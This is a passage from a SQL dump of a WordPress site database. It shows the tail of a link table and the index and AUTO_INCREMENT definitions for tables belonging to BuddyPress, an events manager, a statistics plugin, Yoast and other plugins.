(17, 'https://cookiedatabase.org/cookie/wordpress/wordpress_logged_in_/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(18, 'https://cookiedatabase.org/cookie/unknown-service/remember_/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(19, 'http://localhost', 19, NULL, 'internal', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(20, 'https://cookiedatabase.org/', 19, NULL, 'external', 15, NULL, NULL, NULL, NULL, NULL, NULL),
(21, '{{{profile.url}}}', 37, NULL, 'internal', 30, NULL, NULL, NULL, NULL, NULL, NULL),
(22, '{{{lostpassword.url}}}', 37, NULL, 'internal', 30, NULL, NULL, NULL, NULL, NULL, NULL),
(23, '{{{thread.url}}}', 38, NULL, 'internal', 31, NULL, NULL, NULL, NULL, NULL, NULL),
(24, '{{{thread.url}}}', 39, NULL, 'internal', 32, NULL, NULL, NULL, NULL, NULL, NULL),
(25, '{{{mentioned.url}}}', 40, NULL, 'internal', 33, NULL, NULL, NULL, NULL, NULL, NULL),
(26, '{{{mentioned.url}}}', 41, NULL, 'internal', 34, NULL, NULL, NULL, NULL, NULL, NULL),
(27, '{{{activate.url}}}', 42, NULL, 'internal', 35, NULL, NULL, NULL, NULL, NULL, NULL),
(28, '{{{initiator.url}}}', 43, NULL, 'internal', 36, NULL, NULL, NULL, NULL, NULL, NULL),
(29, '{{{friend-requests.url}}}', 43, NULL, 'internal', 36, NULL, NULL, NULL, NULL, NULL, NULL),
(30, '{{{friendship.url}}}', 44, NULL, 'internal', 37, NULL, NULL, NULL, NULL, NULL, NULL),
(31, '{{{group.url}}}', 45, NULL, 'internal', 38, NULL, NULL, NULL, NULL, NULL, NULL),
(32, '{{{inviter.url}}}', 46, NULL, 'internal', 39, NULL, NULL, NULL, NULL, NULL, NULL),
(33, '{{{invites.url}}}', 46, NULL, 'internal', 39, NULL, NULL, NULL, NULL, NULL, NULL),
(34, '{{{group.url}}}', 46, NULL, 'internal', 39, NULL, NULL, NULL, NULL, NULL, NULL),
(35, '{{{group.url}}}', 47, NULL, 'internal', 40, NULL, NULL, NULL, NULL, NULL, NULL),
(36, '{{{profile.url}}}', 48, NULL, 'internal', 41, NULL, NULL, NULL, NULL, NULL, NULL),
(37, '{{{group-requests.url}}}', 48, NULL, 'internal', 41, NULL, NULL, NULL, NULL, NULL, NULL),
(38, '{{{message.url}}}', 49, NULL, 'internal', 42, NULL, NULL, NULL, NULL, NULL, NULL),
(39, '{{{verify.url}}}', 50, NULL, 'internal', 43, NULL, NULL, NULL, NULL, NULL, NULL),
(40, '{{{group.url}}}', 51, NULL, 'internal', 44, NULL, NULL, NULL, NULL, NULL, NULL),
(41, '{{{group.url}}}', 52, NULL, 'internal', 45, NULL, NULL, NULL, NULL, NULL, NULL),
(42, '{{{inviter.url}}}', 53, NULL, 'internal', 46, NULL, NULL, NULL, NULL, NULL, NULL),
(43, '{{{invite.accept_url}}}', 53, NULL, 'internal', 46, NULL, NULL, NULL, NULL, NULL, NULL),
(44, '{{{site.url}}}', 53, NULL, 'internal', 46, NULL, NULL, NULL, NULL, NULL, NULL),
(45, '{{{manage.url}}}', 54, NULL, 'internal', 47, NULL, NULL, NULL, NULL, NULL, NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `wp_bp_activity`
--
ALTER TABLE `wp_bp_activity`
  ADD PRIMARY KEY (`id`),
  ADD KEY `date_recorded` (`date_recorded`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `item_id` (`item_id`),
  ADD KEY `secondary_item_id` (`secondary_item_id`),
  ADD KEY `component` (`component`),
  ADD KEY `type` (`type`),
  ADD KEY `mptt_left` (`mptt_left`),
  ADD KEY `mptt_right` (`mptt_right`),
  ADD KEY `hide_sitewide` (`hide_sitewide`),
  ADD KEY `is_spam` (`is_spam`);

--
-- Indexes for table `wp_bp_activity_meta`
--
ALTER TABLE `wp_bp_activity_meta`
  ADD PRIMARY KEY (`id`),
  ADD KEY `activity_id` (`activity_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_bp_invitations`
--
ALTER TABLE `wp_bp_invitations`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `inviter_id` (`inviter_id`),
  ADD KEY `invitee_email` (`invitee_email`),
  ADD KEY `class` (`class`),
  ADD KEY `item_id` (`item_id`),
  ADD KEY `secondary_item_id` (`secondary_item_id`),
  ADD KEY `type` (`type`),
  ADD KEY `invite_sent` (`invite_sent`),
  ADD KEY `accepted` (`accepted`);

--
-- Indexes for table `wp_bp_notifications`
--
ALTER TABLE `wp_bp_notifications`
  ADD PRIMARY KEY (`id`),
  ADD KEY `item_id` (`item_id`),
  ADD KEY `secondary_item_id` (`secondary_item_id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `is_new` (`is_new`),
  ADD KEY `component_name` (`component_name`),
  ADD KEY `component_action` (`component_action`),
  ADD KEY `useritem` (`user_id`,`is_new`);

--
-- Indexes for table `wp_bp_notifications_meta`
--
ALTER TABLE `wp_bp_notifications_meta`
  ADD PRIMARY KEY (`id`),
  ADD KEY `notification_id` (`notification_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_bp_optouts`
--
ALTER TABLE `wp_bp_optouts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `email_type` (`email_type`),
  ADD KEY `date_modified` (`date_modified`);

--
-- Indexes for table `wp_bp_xprofile_data`
--
ALTER TABLE `wp_bp_xprofile_data`
  ADD PRIMARY KEY (`id`),
  ADD KEY `field_id` (`field_id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `wp_bp_xprofile_fields`
--
ALTER TABLE `wp_bp_xprofile_fields`
  ADD PRIMARY KEY (`id`),
  ADD KEY `group_id` (`group_id`),
  ADD KEY `parent_id` (`parent_id`),
  ADD KEY `field_order` (`field_order`),
  ADD KEY `can_delete` (`can_delete`),
  ADD KEY `is_required` (`is_required`);

--
-- Indexes for table `wp_bp_xprofile_groups`
--
ALTER TABLE `wp_bp_xprofile_groups`
  ADD PRIMARY KEY (`id`),
  ADD KEY `can_delete` (`can_delete`);

--
-- Indexes for table `wp_bp_xprofile_meta`
--
ALTER TABLE `wp_bp_xprofile_meta`
  ADD PRIMARY KEY (`id`),
  ADD KEY `object_id` (`object_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_cmplz_cookiebanners`
--
ALTER TABLE `wp_cmplz_cookiebanners`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `wp_cmplz_cookies`
--
ALTER TABLE `wp_cmplz_cookies`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `wp_cmplz_services`
--
ALTER TABLE `wp_cmplz_services`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `wp_commentmeta`
--
ALTER TABLE `wp_commentmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `comment_id` (`comment_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_comments`
--
ALTER TABLE `wp_comments`
  ADD PRIMARY KEY (`comment_ID`),
  ADD KEY `comment_post_ID` (`comment_post_ID`),
  ADD KEY `comment_approved_date_gmt` (`comment_approved`,`comment_date_gmt`),
  ADD KEY `comment_date_gmt` (`comment_date_gmt`),
  ADD KEY `comment_parent` (`comment_parent`),
  ADD KEY `comment_author_email` (`comment_author_email`(10));

--
-- Indexes for table `wp_eme_answers`
--
ALTER TABLE `wp_eme_answers`
  ADD UNIQUE KEY `answer_id` (`answer_id`),
  ADD KEY `type` (`type`),
  ADD KEY `related_id` (`related_id`);

--
-- Indexes for table `wp_eme_attendances`
--
ALTER TABLE `wp_eme_attendances`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_eme_bookings`
--
ALTER TABLE `wp_eme_bookings`
  ADD UNIQUE KEY `booking_id` (`booking_id`),
  ADD KEY `status` (`status`);

--
-- Indexes for table `wp_eme_categories`
--
ALTER TABLE `wp_eme_categories`
  ADD UNIQUE KEY `category_id` (`category_id`);

--
-- Indexes for table `wp_eme_countries`
--
ALTER TABLE `wp_eme_countries`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_eme_dgroups`
--
ALTER TABLE `wp_eme_dgroups`
  ADD UNIQUE KEY `id` (`id`),
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `wp_eme_discounts`
--
ALTER TABLE `wp_eme_discounts`
  ADD UNIQUE KEY `id` (`id`),
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `wp_eme_events`
--
ALTER TABLE `wp_eme_events`
  ADD UNIQUE KEY `event_id` (`event_id`),
  ADD KEY `event_start` (`event_start`),
  ADD KEY `event_end` (`event_end`);

--
-- Indexes for table `wp_eme_formfields`
--
ALTER TABLE `wp_eme_formfields`
  ADD UNIQUE KEY `field_id` (`field_id`);

--
-- Indexes for table `wp_eme_groups`
--
ALTER TABLE `wp_eme_groups`
  ADD UNIQUE KEY `group_id` (`group_id`);

--
-- Indexes for table `wp_eme_holidays`
--
ALTER TABLE `wp_eme_holidays`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_eme_locations`
--
ALTER TABLE `wp_eme_locations`
  ADD UNIQUE KEY `location_id` (`location_id`);

--
-- Indexes for table `wp_eme_mailings`
--
ALTER TABLE `wp_eme_mailings`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_eme_members`
--
ALTER TABLE `wp_eme_members`
  ADD UNIQUE KEY `member_id` (`member_id`),
  ADD KEY `related_member_id` (`related_member_id`);

--
-- Indexes for table `wp_eme_memberships`
--
ALTER TABLE `wp_eme_memberships`
  ADD UNIQUE KEY `membership_id` (`membership_id`);

--
-- Indexes for table `wp_eme_mqueue`
--
ALTER TABLE `wp_eme_mqueue`
  ADD UNIQUE KEY `id` (`id`),
  ADD KEY `status` (`status`),
  ADD KEY `random_id` (`random_id`);

--
-- Indexes for table `wp_eme_payments`
--
ALTER TABLE `wp_eme_payments`
  ADD UNIQUE KEY `id` (`id`),
  ADD KEY `random_id` (`random_id`);

--
-- Indexes for table `wp_eme_people`
--
ALTER TABLE `wp_eme_people`
  ADD UNIQUE KEY `person_id` (`person_id`),
  ADD KEY `status` (`status`);

--
-- Indexes for table `wp_eme_recurrence`
--
ALTER TABLE `wp_eme_recurrence`
  ADD UNIQUE KEY `recurrence_id` (`recurrence_id`);

--
-- Indexes for table `wp_eme_states`
--
ALTER TABLE `wp_eme_states`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_eme_tasks`
--
ALTER TABLE `wp_eme_tasks`
  ADD UNIQUE KEY `task_id` (`task_id`);

--
-- Indexes for table `wp_eme_task_signups`
--
ALTER TABLE `wp_eme_task_signups`
  ADD UNIQUE KEY `id` (`id`),
  ADD KEY `event_id` (`event_id`);

--
-- Indexes for table `wp_eme_templates`
--
ALTER TABLE `wp_eme_templates`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_gwolle_gb_entries`
--
ALTER TABLE `wp_gwolle_gb_entries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_gwolle_gb_log`
--
ALTER TABLE `wp_gwolle_gb_log`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_limit_login`
--
ALTER TABLE `wp_limit_login`
  ADD PRIMARY KEY (`login_id`);

--
-- Indexes for table `wp_links`
--
ALTER TABLE `wp_links`
  ADD PRIMARY KEY (`link_id`),
  ADD KEY `link_visible` (`link_visible`);

--
-- Indexes for table `wp_options`
--
ALTER TABLE `wp_options`
  ADD PRIMARY KEY (`option_id`),
  ADD UNIQUE KEY `option_name` (`option_name`),
  ADD KEY `autoload` (`autoload`);

--
-- Indexes for table `wp_postmeta`
--
ALTER TABLE `wp_postmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `post_id` (`post_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_posts`
--
ALTER TABLE `wp_posts`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `post_name` (`post_name`(191)),
  ADD KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  ADD KEY `post_parent` (`post_parent`),
  ADD KEY `post_author` (`post_author`);

--
-- Indexes for table `wp_signups`
--
ALTER TABLE `wp_signups`
  ADD PRIMARY KEY (`signup_id`),
  ADD KEY `activation_key` (`activation_key`),
  ADD KEY `user_email` (`user_email`),
  ADD KEY `user_login_email` (`user_login`,`user_email`),
  ADD KEY `domain_path` (`domain`(140),`path`(51));

--
-- Indexes for table `wp_statistics_exclusions`
--
ALTER TABLE `wp_statistics_exclusions`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `date` (`date`),
  ADD KEY `reason` (`reason`);

--
-- Indexes for table `wp_statistics_historical`
--
ALTER TABLE `wp_statistics_historical`
  ADD PRIMARY KEY (`ID`),
  ADD UNIQUE KEY `page_id` (`page_id`),
  ADD UNIQUE KEY `uri` (`uri`),
  ADD KEY `category` (`category`);

--
-- Indexes for table `wp_statistics_pages`
--
ALTER TABLE `wp_statistics_pages`
  ADD PRIMARY KEY (`page_id`),
  ADD UNIQUE KEY `date_2` (`date`,`uri`),
  ADD KEY `url` (`uri`),
  ADD KEY `date` (`date`),
  ADD KEY `id` (`id`),
  ADD KEY `uri` (`uri`,`count`,`id`);

--
-- Indexes for table `wp_statistics_search`
--
ALTER TABLE `wp_statistics_search`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `last_counter` (`last_counter`),
  ADD KEY `engine` (`engine`),
  ADD KEY `host` (`host`);

--
-- Indexes for table `wp_statistics_useronline`
--
ALTER TABLE `wp_statistics_useronline`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `wp_statistics_visit`
--
ALTER TABLE `wp_statistics_visit`
  ADD PRIMARY KEY (`ID`),
  ADD UNIQUE KEY `unique_date` (`last_counter`);

--
-- Indexes for table `wp_statistics_visitor`
--
ALTER TABLE `wp_statistics_visitor`
  ADD PRIMARY KEY (`ID`),
  ADD UNIQUE KEY `date_ip_agent` (`last_counter`,`ip`,`agent`(50),`platform`(50),`version`(50)),
  ADD KEY `agent` (`agent`),
  ADD KEY `platform` (`platform`),
  ADD KEY `version` (`version`),
  ADD KEY `location` (`location`);

--
-- Indexes for table `wp_statistics_visitor_relationships`
--
ALTER TABLE `wp_statistics_visitor_relationships`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `visitor_id` (`visitor_id`),
  ADD KEY `page_id` (`page_id`);

--
-- Indexes for table `wp_termmeta`
--
ALTER TABLE `wp_termmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `term_id` (`term_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_terms`
--
ALTER TABLE `wp_terms`
  ADD PRIMARY KEY (`term_id`),
  ADD KEY `slug` (`slug`(191)),
  ADD KEY `name` (`name`(191));

--
-- Indexes for table `wp_term_relationships`
--
ALTER TABLE `wp_term_relationships`
  ADD PRIMARY KEY (`object_id`,`term_taxonomy_id`),
  ADD KEY `term_taxonomy_id` (`term_taxonomy_id`);

--
-- Indexes for table `wp_term_taxonomy`
--
ALTER TABLE `wp_term_taxonomy`
  ADD PRIMARY KEY (`term_taxonomy_id`),
  ADD UNIQUE KEY `term_id_taxonomy` (`term_id`,`taxonomy`),
  ADD KEY `taxonomy` (`taxonomy`);

--
-- Indexes for table `wp_usermeta`
--
ALTER TABLE `wp_usermeta`
  ADD PRIMARY KEY (`umeta_id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Indexes for table `wp_users`
--
ALTER TABLE `wp_users`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `user_login_key` (`user_login`),
  ADD KEY `user_nicename` (`user_nicename`),
  ADD KEY `user_email` (`user_email`);

--
-- Indexes for table `wp_wsm_browsers`
--
ALTER TABLE `wp_wsm_browsers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_countries`
--
ALTER TABLE `wp_wsm_countries`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `wp_wsm_dailyhourlyreport`
--
ALTER TABLE `wp_wsm_dailyhourlyreport`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_datewise_report`
--
ALTER TABLE `wp_wsm_datewise_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_loguniquevisit`
--
ALTER TABLE `wp_wsm_loguniquevisit`
  ADD PRIMARY KEY (`id`),
  ADD KEY `index_config_datetime` (`configId`,`visitLastActionTime`),
  ADD KEY `index_datetime` (`visitLastActionTime`),
  ADD KEY `index_idvisitor` (`visitorId`);

--
-- Indexes for table `wp_wsm_logvisit`
--
ALTER TABLE `wp_wsm_logvisit`
  ADD PRIMARY KEY (`id`),
  ADD KEY `index_visitId` (`visitId`),
  ADD KEY `index_siteId_serverTime` (`siteId`,`serverTime`);

--
-- Indexes for table `wp_wsm_monthlydailyreport`
--
ALTER TABLE `wp_wsm_monthlydailyreport`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_monthwise_report`
--
ALTER TABLE `wp_wsm_monthwise_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_osystems`
--
ALTER TABLE `wp_wsm_osystems`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_regions`
--
ALTER TABLE `wp_wsm_regions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_resolutions`
--
ALTER TABLE `wp_wsm_resolutions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_searchengines`
--
ALTER TABLE `wp_wsm_searchengines`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_toolbars`
--
ALTER TABLE `wp_wsm_toolbars`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_url_log`
--
ALTER TABLE `wp_wsm_url_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `index_type_hash` (`pageId`,`hash`,`searchEngine`),
  ADD KEY `index_tb_hash` (`pageId`,`hash`,`searchEngine`);

--
-- Indexes for table `wp_wsm_yearlymonthlyreport`
--
ALTER TABLE `wp_wsm_yearlymonthlyreport`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_wsm_yearwise_report`
--
ALTER TABLE `wp_wsm_yearwise_report`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `wp_yoast_indexable`
--
ALTER TABLE `wp_yoast_indexable`
  ADD PRIMARY KEY (`id`),
  ADD KEY `object_type_and_sub_type` (`object_type`,`object_sub_type`),
  ADD KEY `object_id_and_type` (`object_id`,`object_type`),
  ADD KEY `permalink_hash_and_object_type` (`permalink_hash`,`object_type`),
  ADD KEY `subpages` (`post_parent`,`object_type`,`post_status`,`object_id`),
  ADD KEY `prominent_words` (`prominent_words_version`,`object_type`,`object_sub_type`,`post_status`),
  ADD KEY `published_sitemap_index` (`object_published_at`,`is_robots_noindex`,`object_type`,`object_sub_type`);

--
-- Indexes for table `wp_yoast_indexable_hierarchy`
--
ALTER TABLE `wp_yoast_indexable_hierarchy`
  ADD PRIMARY KEY (`indexable_id`,`ancestor_id`),
  ADD KEY `indexable_id` (`indexable_id`),
  ADD KEY `ancestor_id` (`ancestor_id`),
  ADD KEY `depth` (`depth`);

--
-- Indexes for table `wp_yoast_migrations`
--
ALTER TABLE `wp_yoast_migrations`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `wp_yoast_migrations_version` (`version`);

--
-- Indexes for table `wp_yoast_primary_term`
--
ALTER TABLE `wp_yoast_primary_term`
  ADD PRIMARY KEY (`id`),
  ADD KEY `post_taxonomy` (`post_id`,`taxonomy`),
  ADD KEY `post_term` (`post_id`,`term_id`);

--
-- Indexes for table `wp_yoast_seo_links`
--
ALTER TABLE `wp_yoast_seo_links`
  ADD PRIMARY KEY (`id`),
  ADD KEY `link_direction` (`post_id`,`type`),
  ADD KEY `indexable_link_direction` (`indexable_id`,`type`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `wp_bp_activity`
--
ALTER TABLE `wp_bp_activity`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_activity_meta`
--
ALTER TABLE `wp_bp_activity_meta`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_invitations`
--
ALTER TABLE `wp_bp_invitations`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_notifications`
--
ALTER TABLE `wp_bp_notifications`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_notifications_meta`
--
ALTER TABLE `wp_bp_notifications_meta`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_optouts`
--
ALTER TABLE `wp_bp_optouts`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_xprofile_data`
--
ALTER TABLE `wp_bp_xprofile_data`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_bp_xprofile_fields`
--
ALTER TABLE `wp_bp_xprofile_fields`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_bp_xprofile_groups`
--
ALTER TABLE `wp_bp_xprofile_groups`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_bp_xprofile_meta`
--
ALTER TABLE `wp_bp_xprofile_meta`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `wp_cmplz_cookiebanners`
--
ALTER TABLE `wp_cmplz_cookiebanners`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_cmplz_cookies`
--
ALTER TABLE `wp_cmplz_cookies`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT for table `wp_cmplz_services`
--
ALTER TABLE `wp_cmplz_services`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `wp_commentmeta`
--
ALTER TABLE `wp_commentmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_comments`
--
ALTER TABLE `wp_comments`
  MODIFY `comment_ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `wp_eme_answers`
--
ALTER TABLE `wp_eme_answers`
  MODIFY `answer_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_attendances`
--
ALTER TABLE `wp_eme_attendances`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_bookings`
--
ALTER TABLE `wp_eme_bookings`
  MODIFY `booking_id` mediumint(9) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_categories`
--
ALTER TABLE `wp_eme_categories`
  MODIFY `category_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_countries`
--
ALTER TABLE `wp_eme_countries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_dgroups`
--
ALTER TABLE `wp_eme_dgroups`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_discounts`
--
ALTER TABLE `wp_eme_discounts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_events`
--
ALTER TABLE `wp_eme_events`
  MODIFY `event_id` mediumint(9) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `wp_eme_formfields`
--
ALTER TABLE `wp_eme_formfields`
  MODIFY `field_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_groups`
--
ALTER TABLE `wp_eme_groups`
  MODIFY `group_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_holidays`
--
ALTER TABLE `wp_eme_holidays`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_locations`
--
ALTER TABLE `wp_eme_locations`
  MODIFY `location_id` mediumint(9) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `wp_eme_mailings`
--
ALTER TABLE `wp_eme_mailings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_members`
--
ALTER TABLE `wp_eme_members`
  MODIFY `member_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_memberships`
--
ALTER TABLE `wp_eme_memberships`
  MODIFY `membership_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_mqueue`
--
ALTER TABLE `wp_eme_mqueue`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_payments`
--
ALTER TABLE `wp_eme_payments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_people`
--
ALTER TABLE `wp_eme_people`
  MODIFY `person_id` mediumint(9) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_recurrence`
--
ALTER TABLE `wp_eme_recurrence`
  MODIFY `recurrence_id` mediumint(9) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_states`
--
ALTER TABLE `wp_eme_states`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_tasks`
--
ALTER TABLE `wp_eme_tasks`
  MODIFY `task_id` mediumint(9) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_task_signups`
--
ALTER TABLE `wp_eme_task_signups`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_eme_templates`
--
ALTER TABLE `wp_eme_templates`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_gwolle_gb_entries`
--
ALTER TABLE `wp_gwolle_gb_entries`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_gwolle_gb_log`
--
ALTER TABLE `wp_gwolle_gb_log`
  MODIFY `id` int(8) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_limit_login`
--
ALTER TABLE `wp_limit_login`
  MODIFY `login_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `wp_links`
--
ALTER TABLE `wp_links`
  MODIFY `link_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_options`
--
ALTER TABLE `wp_options`
  MODIFY `option_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2201;

--
-- AUTO_INCREMENT for table `wp_postmeta`
--
ALTER TABLE `wp_postmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=110;

--
-- AUTO_INCREMENT for table `wp_posts`
--
ALTER TABLE `wp_posts`
  MODIFY `ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=64;

--
-- AUTO_INCREMENT for table `wp_signups`
--
ALTER TABLE `wp_signups`
  MODIFY `signup_id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_exclusions`
--
ALTER TABLE `wp_statistics_exclusions`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_historical`
--
ALTER TABLE `wp_statistics_historical`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_pages`
--
ALTER TABLE `wp_statistics_pages`
  MODIFY `page_id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_search`
--
ALTER TABLE `wp_statistics_search`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_useronline`
--
ALTER TABLE `wp_statistics_useronline`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `wp_statistics_visit`
--
ALTER TABLE `wp_statistics_visit`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_visitor`
--
